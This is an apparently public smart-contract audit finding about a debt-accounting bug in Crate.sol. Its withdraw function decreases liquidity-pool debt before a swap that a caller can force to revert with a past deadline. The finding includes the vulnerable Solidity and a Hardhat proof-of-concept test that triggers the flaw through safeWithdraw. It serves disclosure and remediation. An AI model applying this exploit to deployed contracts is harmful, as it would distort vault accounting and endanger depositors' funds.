# Wrong debt calculations during withdrawal

## Description

PATH: `Crate.sol`

The functions `safeWithdraw`, and `safeRedeem` have inconsistent debt calculation logic.

A bad actor can call `safeWithdraw/safeRedeem` function with such parameters that revert `swapVirtualToAsset` function call (for example, with a past deadline). That function is executed in `try/catch` block, but before the `try/catch` the `_withdraw()` function decreases `liquidityPool.debt`. Even if `swapToVirtualAsset()` reverts the `liquidityPool.debt` will already be decreased.

As a result, `_withdraw()` function decreases `crate.totalAssets()` twice. It affects all calculations, f.e `increaseLiquidity`, `decreaseLiquidity`, `rebalanceLiquidity`, `shareToAsset`, `assetToShare`, etc.

## Code Snippet

```solidity
   function _withdraw(
        uint256 _amount,
        uint256 _shares,
        uint256 _minAmountOut,
        uint256 _deadline,
        address _receiver,
        address _owner
    ) internal nonReentrant returns (uint256 recovered) {
        if (_amount == 0 || _shares == 0) revert AmountZero();

        // We spend the allowance if the msg.sender isn't the receiver
        if (msg.sender != _owner) {
            _spendAllowance(_owner, msg.sender, _shares);
        }

        // Check for rounding error since we round down in previewRedeem.
        if (convertToAssets(_shares) == 0)
            revert IncorrectAssetAmount(convertToAssets(_shares));

        // We burn the tokens
        _burn(_owner, _shares);

        // Allows to take a withdraw fee
        _amount = (_amount * (MAX_BPS - withdrawFee)) / MAX_BPS;

        if (liquidityPoolEnabled) {
            // We don't take into account the eventual slippage, since it will
            // be paid to the depositoors
            liquidityPool.debt -= Math.min(_amount, liquidityPool.debt);
            try
                liquidityPool.swap.swapVirtualToAsset(
                    _amount,
                    _minAmountOut,
                    _deadline,
                    _receiver
                )
            returns (uint256 dy) {
                recovered = dy;
            } catch {
                // if the swap fails, we send the funds available
                asset.safeTransfer(_receiver, _amount);
                recovered = _amount;
            }
        } else {
            // If the liquidity pool is not enabled, we send the funds available
            // This allows for the bootstrapping of the pool at start
            asset.safeTransfer(_receiver, _amount);
            recovered = _amount;
        }

        if (_minAmountOut > 0 && recovered < _minAmountOut)
            revert IncorrectAssetAmount(recovered);

        emit Withdraw(msg.sender, _receiver, _owner, _amount, _shares);
        return (recovered);
    }
```

## Remediation

We would recommend to move decreasing `liquididyPool.dept` decreasing in try block. 

## POC

```typescript
const { expect } = require("chai");
import assert from "assert";
import * as fxt from "../utils/fixtures";
import { BigNumber, Contract, ContractFactory } from "ethers";
import { ethers, upgrades } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import a from "../utils/mainnet-adresses";
import params from "../utils/params";
import { Crate } from "../../typechain-types/contracts/Crate";
import { ElasticLiquidityPool } from "../../typechain-types/contracts/ElasticLiquidityPool";
import { MockAaveWrongBalanceDepositInterface } from "../../typechain-types/contracts/mocks/MockAaveBalanceDeposit.sol/MockAaveWrongBalanceDeposit";
describe("Crate Liquidity pool management", function () {
  this.beforeEach(async function () {
    this.deployer = await fxt.getDeployer();
    this.alice = await fxt.getAlice();
    this.bob = await fxt.getBob();
    this.usdc = await fxt.getUSDCToken(this.deployer);
    await fxt.getUSDC(this.deployer);
    this.decimals = await this.usdc.decimals();
    this.aaveUSDC = await fxt.getAaveUSDC(this.deployer);
    //                  //
    // Crate deployment //
    //                  //
    this.crate = await fxt.deployCrate(this.deployer);
    // We unpause to allow withdraws
    await this.crate.unpause();
    expect(await this.crate.paused()).to.equal(false);
    // We increase maxTotalAssets to allow deposits
    await this.crate.setMaxTotalAssets(ethers.constants.MaxUint256);
    // We can deposit more USDC
    await this.crate.deposit(params.seed_deposit.mul(9), this.deployer.address);
    // We can check that the balances are correct before proceeding
    expect(await this.crate.totalSupply()).to.equal(
      params.seed_deposit.mul(10)
    );
    expect(await this.crate.balanceOf(this.deployer.address)).to.equal(
      params.seed_deposit.mul(10)
    );
    this.alice = await fxt.getAlice();
    // We can save the balances after the initial deposit
    this.balanceEOABefore = await this.usdc.balanceOf(this.deployer.address);
    this.balanceCrateBefore = await this.usdc.balanceOf(this.crate.address);
    //                 //
    // Swap deployment //
    //                 //
    this.swap = await fxt.deploySwap(this.deployer, this.crate);
  });
  describe("Swap in and out", function () {
    beforeEach(async function () {
      await this.crate.setFees(0, 0, 0);
      this.balUSDCCrateBefore = await this.usdc.balanceOf(this.crate.address);
      // expect(this.balUSDCCrateBefore).to.be.greaterThan(0);
      this.crate.migrateLiquidityPool(
        this.swap.address,
        this.balUSDCCrateBefore
      )
      // We set up the liq pool
      // await expect(
      //   this.crate.migrateLiquidityPool(
      //     this.swap.address,
      //     this.balUSDCCrateBefore
      //   )
      // ).not.to.be.reverted;
      // expect(await this.crate.liquidityPoolEnabled()).to.be.equal(true);
      // We check that the liq pool has aaveUSDC
      // expect(await this.aaveUSDC.balanceOf(this.swap.address)).to.equal(
        // this.balUSDCCrateBefore
      // );
    });
    it("Deposit with ELB Full", async function () {
        const deployer = this.deployer;
        const alice = this.alice;
        const bob = this.bob;
        const crate = this.crate;
        const usdc = this.usdc;
        await fxt.getUSDC(alice);
        await fxt.getUSDC(bob);
        await usdc.connect(alice).approve(crate.address, ethers.BigNumber.from("1000000000000000000"));
        await usdc.connect(bob).approve(crate.address, ethers.BigNumber.from("1000000000000000000"));
        const depositAmount = 1000;
        const withdrawAmount = 100;
        // notmal withdraw  
        console.log("Alice usdc balance before normal deposit: ", await usdc.balanceOf(alice.address));
        await crate.connect(alice).deposit(depositAmount, alice.address);
        console.log("Alice usdc balance after normal deposit: ", await usdc.balanceOf(alice.address), "\n");
        console.log("Alice usdc balance before normal withdraw: ", await usdc.balanceOf(alice.address));
        console.log("Total asset before withdraw after deposit: ", await crate.totalAssets(), "\n");
        await crate.connect(alice).withdraw(withdrawAmount, alice.address, alice.address);
        console.log("Alice usdc balance after normal withdraw: ", await usdc.balanceOf(alice.address));
        console.log("Total asset after withdraw after deposit: ", await crate.totalAssets(), "\n");
        // not normal withdraw
        console.log("Alice usdc balance before normal deposit: ", await usdc.balanceOf(alice.address));
        await crate.connect(alice).deposit(depositAmount, alice.address);
        console.log("Alice usdc balance after normal deposit: ", await usdc.balanceOf(alice.address));
        console.log("Alice usdc balance before normal withdraw: ", await usdc.balanceOf(alice.address));
        console.log("Total asset before withdraw after deposit: ", await crate.totalAssets());
        await crate.connect(alice).safeWithdraw(
            withdrawAmount,
            0,
            0,
            alice.address,
            alice.address
        );
        console.log("Alice usdc balance after normal withdraw: ", await usdc.balanceOf(alice.address));
        console.log("Total asset after withdraw after deposit: ", await crate.totalAssets());
    });
  });
});

```

>The full report can be found [here](https://github.com/Hexens/Smart-Contract-Review-Public-Reports/blob/main/Astrolab_%20April23_Audit(Public)_upd.pdf).

